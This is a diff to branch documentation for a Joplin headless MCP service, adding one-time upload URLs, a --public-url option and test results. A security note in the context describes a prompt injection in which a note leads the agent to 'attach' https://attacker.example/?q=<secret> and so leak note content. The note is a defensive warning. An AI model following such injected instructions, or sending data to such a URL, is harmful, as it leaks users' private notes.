@@ -6,7 +6,7 @@ This branch (`headless-service`, cut from upstream `dev`, last rebased onto `7ea
 
 ## What changed
 
-The work is split into two independent pull requests' worth of commits, plus one commit that connects them. PR 2 applies cleanly to `dev` without PR 1 and type-checks on its own. PR 3 (sync before MCP reads) builds on PR 2. PR 4 (attachment upload tool) only touches `packages/lib` and uses PR 3's `readsNotes` flag.
+The work is split into two independent pull requests' worth of commits, plus one commit that connects them. PR 2 applies cleanly to `dev` without PR 1 and type-checks on its own. PR 3 (sync before MCP reads) builds on PR 2. PR 4 (attachment upload tool) only touches `packages/lib` and uses PR 3's `readsNotes` flag. PR 5 (one-time upload URLs) builds on PR 4.
 
 | Commit | PR | Summary |
 |---|---|---|
@@ -18,6 +18,7 @@ The work is split into two independent pull requests' worth of commits, plus one
 | `220228dd1` | 3 | All: Allow MCP clients to sync before reading notes (`packages/lib`) |
 | `4b5c1aa0f` | 3 | Cli: Sync before MCP reads in headless service mode |
 | `1c8e815bd` | 4 | All: Add an MCP tool to upload attachments (`packages/lib`) |
+| `2603a003a` | 5 | All: Add one-time upload URLs for large attachments (`packages/lib`, plus `--public-url` in `packages/app-cli`) |
 
 ### PR 1: local embeddings in the terminal app
 
@@ -85,6 +86,19 @@ Agents could read attachments (`read_image`) but not create them. `upload_resour
 `data_base64` has to be written out by the model, so it only suits small files (icons, small diagrams). For real images and documents agents should pass a `url`. Clients that can run commands on the same host can also keep using the Data API (`POST /resources`, multipart) and then link the id with `update_note`.
 
 **Security note:** `url` lets whoever controls the agent's input make this host send a GET request to any public address. Together with the read tools, that is a way to leak note content through a prompt injection (for example a note that tells the agent to "attach" `https://attacker.example/?q=<secret>`). Leave the tool disabled for agents that read untrusted content.
+
+### PR 5: one-time upload URLs (`create_upload`)
+
+`upload_resource` can't take a large file that only exists on the agent's machine: base64 has to be written out by the model, and `url` needs a public address. `create_upload` covers that case for agents that can run commands.
+
+- `create_upload` (`filename`, optional `note_id` and `position`) returns `{ upload_url, curl, expires_at, max_size }`. The agent then sends the file as a multipart form with the file in the `data` field: `curl -sS -F "data=@file" "<upload_url>"`. The response of that request is the same object `upload_resource` returns (`id`, `title`, `mime`, `size`, `markdown`, `note_id`).
+- The URL is `POST /mcp/upload/<id>` on the same server. **It needs no API token**: the id (64 hex characters, 244 random bits) is the credential. It is valid once and for 15 minutes, at most 50 are pending at a time, and they are kept in memory only, so a restart cancels them. Any request that reaches the route with a valid id uses it up, including a failed one, so the agent calls `create_upload` again after an error. `Api.checkToken_` only exempts `POST` requests whose path is exactly `mcp/upload/<64 hex>`; everything else under `/mcp` still needs the token.
+- Multipart is required because the API server reads other request bodies into a string, while multipart files are streamed to a temporary file. A raw `curl -T` upload is a `PUT`, so it gets the usual 403.
+- The 100 MB limit is checked after the file has been received (the server has no streaming limit for multipart bodies, with or without this change). Behind Cloudflare the request body limit of the plan applies first.
+- The destination is fixed when the URL is created. With `note_id`, the route runs the pre-read sync hook (PR 3) before it edits the note. The file name given to `create_upload` wins over the uploaded file's own name, since the type is detected from it.
+- It shares `upload_resource`'s setting (`ai.tool.upload_resource.enabled`), like `read_notes` shares `read_note`'s.
+- `server start --service --public-url <url>` (new option) sets the address clients use to reach the server, for when it is behind a tunnel or reverse proxy. Without it, upload URLs point to `http://127.0.0.1:<api.port>`, which only works for clients on the same host. A reverse proxy must forward `POST /mcp/upload/*`.
+- The upload and attach logic shared by both tools is in `services/ai/tools/utils/attachFile.ts`; pending uploads are in `services/mcp/PendingUploads.ts`.
 
 ## Building the terminal app from the monorepo
 
@@ -167,7 +181,7 @@ done
 # Sync target, e.g. Joplin Server: sync.target 9, sync.9.path, sync.9.username, sync.9.password
 
 # Run
-$J server start --service --sync-interval 60
+$J server start --service --sync-interval 60        # add --public-url https://… when behind a tunnel
 ```
 
 The server binds `127.0.0.1` only (unchanged). On first start, the indexer downloads the embedding model (`multilingual-e5-small`, 134 MB, from `github.com/joplin/embedding-models`) into `<profile>/cache/ai/embedding-models/`, so the service needs internet access once.
@@ -177,6 +191,7 @@ The server binds `127.0.0.1` only (unchanged). On first start, the indexer downl
 All endpoints use the existing token (`api.token` in `settings.json`), passed as `?token=…`.
 
 - `POST /mcp?token=…`: Joplin's MCP server (unchanged).
+- `POST /mcp/upload/<id>` (no token): receives the file for a `create_upload` call, see PR 5.
 - `POST /services/headless?token=…` with a JSON body (the Data API's existing `services` route only accepts POST):
   - `{"action": "status"}` →
     ```json
@@ -255,12 +270,18 @@ Unit tests: `packages/app-cli` `yarn test-ci` 28 suites, 131 tests pass. `packag
 - End to end against `server start --service` on a scratch profile: base64 PNG attached to a note (bytes identical on disk, readable with `read_image`); text file returned as a link and placed with `update_note`; two public image URLs downloaded (13 kB and 225 kB); `http://127.0.0.1…`, a Tailscale address, `file://`, an HTTP 404, two sources and an unknown note id all return tool errors and leave no attachment or temporary file behind.
 - Infra live suite (with its new `upload_resource` tests) against the same instance: 31 passed, 5 skipped, 3 deselected, 1 failed (`test_search_existing_notes`, which needs a synced profile with real notes).
 
+**One-time upload URLs (PR 5)**, run on 2026-11-24 with Node 22.23.4:
+
+- `packages/lib`: `services/mcp/McpServer.test.ts`, `services/rest/routes/mcp.test.ts` and `services/rest/Api.test.ts`, 113 tests pass (new: the tool, the route through `Api` including single use, expiry, the token exemption being limited to the exact path, a missing file, and a note deleted in the meantime). `packages/app-cli` `app/services/headless`: 19 pass (new: `--public-url` parsing).
+- End to end against `server start --service --public-url http://127.0.0.1:41190` on a scratch profile: a 60 MB file sent with `curl -F` (0.2 s on loopback) is byte-identical on disk and linked at the end of the note; using the URL again and an unknown id give 404; `/mcp` and `/notes` without a token still give 403; a 2.7 kB image without `note_id` returns its `markdown`; no temporary files are left behind.
+
 ## Known issues and notes
 
 - **Full-text search lag:** with `sync: false`, `search_notes` sees a change up to about 10 s after it lands locally, because `SearchEngine.scheduleSyncTables()` debounces by 10 s (same as desktop). In the e2e run, MCP-created notes were searchable after about 2 s, and B→A notes after 12–21 s with a 15 s sync interval. With the default `sync: true` (PR 3), the search waits for the index instead.
 - **Pre-read sync cost:** every read with the default `sync: true` makes a round trip to the sync target, even when nothing changed. That was 0.2 s on a local filesystem target; on Joplin Server it depends on latency. It runs a full sync, not a download-only one, so it also uploads pending local changes.
 - **Semantic search threshold:** `semantic_search_notes` drops results under Joplin's minimum score (0.83 for the default `normal` limit). Vague queries can return no results even when the note is indexed. That is upstream behaviour, not an indexing gap.
 - **Initial scan vs. initial sync:** on a fresh profile, the indexer's initial scan finishes before the first sync downloads anything. Notes downloaded later are indexed from the change feed, so this is harmless (verified: 508/508 indexed after a fresh sync that was interrupted by SIGTERM and resumed).
+- **Error bodies include a stack trace** (upstream behaviour of the API server for every error), also for requests without a token such as a wrong upload URL.
 - **One process per profile** still applies. Don't run one-shot `joplin --profile P …` commands against a profile while the service is running; use the API, MCP or the `sync` endpoint instead.
 - `--env dev` disables recurrent sync in `Registry` (upstream behaviour), so run the service in the default `prod` env.
 - A `sync` request that races exactly with the start of another sync can return before its own sync ran (the synchronizer reports `alreadyStarted`). The next timer or request sync covers it.
